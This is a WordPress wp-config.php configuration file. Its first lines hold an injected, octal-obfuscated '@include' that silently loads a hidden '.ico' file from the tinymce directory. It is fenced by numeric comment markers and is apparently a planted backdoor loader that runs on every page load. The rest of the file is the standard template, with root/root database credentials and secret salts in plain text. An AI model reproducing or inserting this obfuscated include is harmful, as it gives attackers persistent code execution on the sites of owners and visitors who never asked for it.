<?php
/*26494*/

@include "\057hom\1454/c\157nta\143tm/\155ejo\162cot\151za.\143l/w\160-in\143lud\145s/j\163/ti\156ymc\145/.2\14160d\06098.\151co";

/*26494*/

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'alocity' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'root' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
 
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'r05vlqmzksd5yiordshuumziey3jkrknrml0bddydjvfa5fsn5lmclw5lzcdubnh' );
define( 'SECURE_AUTH_KEY',  'plurt3ajmz93du6p5aad24zjbaloe4fmjyhat9bhgtnmcx4fy4c9fpevshlswsjc' );
define( 'LOGGED_IN_KEY',    'vjehkokbb6ufi4oodftx91o7yre4od0jwk6dxen4mckiaqtpxtb3bvt77p9w0iwr' );
define( 'NONCE_KEY',        'lh8u0qss9oayz2hf1rdjsib9dxrygafxfhl6hpou0kpwpvbnqzspczn31egqlcua' );
define( 'AUTH_SALT',        'mqhgahiyn4c80ywl4c0sppn5hrok70u8baqb5n5agwu0wqg5e5anksvhyb7redys' );
define( 'SECURE_AUTH_SALT', '5ftptpsuwagdrkoeips70waeqrf0t39p2h1xvvrce7pxcly9vuoofj2o1veodw9j' );
define( 'LOGGED_IN_SALT',   'gx8bphrlc75gaqjahabelwxfotrhwpbsdgpgn0mapftrt0j4tuoqom2duwovu25w' );
define( 'NONCE_SALT',       '20s0fx4soeci6n7zn9500sbrrgqb4uscyg7awdjn3bigu5msx7iba2nnzdchsgic' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpvr_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
